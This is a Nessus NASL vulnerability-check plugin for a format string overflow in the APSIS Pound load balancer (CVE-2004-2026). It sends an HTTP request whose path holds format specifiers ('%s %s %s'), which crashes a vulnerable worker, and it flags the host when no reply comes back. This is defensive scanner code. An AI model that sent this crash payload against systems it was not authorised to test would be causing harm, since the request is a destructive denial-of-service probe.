if(description)
{
  script_id(12007);
  script_version ("$Revision: 1.7 $");
  script_cve_id("CVE-2004-2026");
  script_bugtraq_id(10267);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"5746");
  }
  name["english"] = "APSIS Pound Load Balancer Format String Overflow";
  script_name(english:name["english"]);

  desc["english"] = "
The remote server is vulnerable to a remote format string bug 
which can allow remote attackers to gain access to confidential
data.  Pound versions less than 1.6 are vulnerable to this issue.

See also: http://www.apsis.ch/pound/
Solution: upgrade to at least version 1.6 of APSIS Pound.
Risk factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "APSIS Pound Load Balancer Format String Overflow";

 script_summary(english:summary["english"]);
 script_category(ACT_DESTRUCTIVE_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");

 family["english"] = "Gain root remotely";

 script_family(english:family["english"]);

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


# start script

include("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port))
	exit(0);

init = string("GET /%s HTTP/1.0\r\n\r\n");
soc = open_sock_tcp(port);
if ( ! soc ) exit(0);
send(socket:soc, data:init);
r = recv_line(socket:soc, length:1024);
if (!r)
	exit(0);

close(soc);

if ("HTTP/1.0 503 Service Unavailable" >< r)
{
	req = string("GET /%s %s %s HTTP/1.0\r\n\r\n");
	soc = open_sock_tcp(port);
	send(socket:soc, data:req);
	r = recv_line(socket:soc, length:1024);

	# this test is classified as DESTRUCTIVE, but the service *does* restart automagically 
	# you'll see something like this in your logs
	# pound: MONITOR: worker exited on signal 11, restarting...

	if (!r)
		security_hole(port);

	close(soc);
}
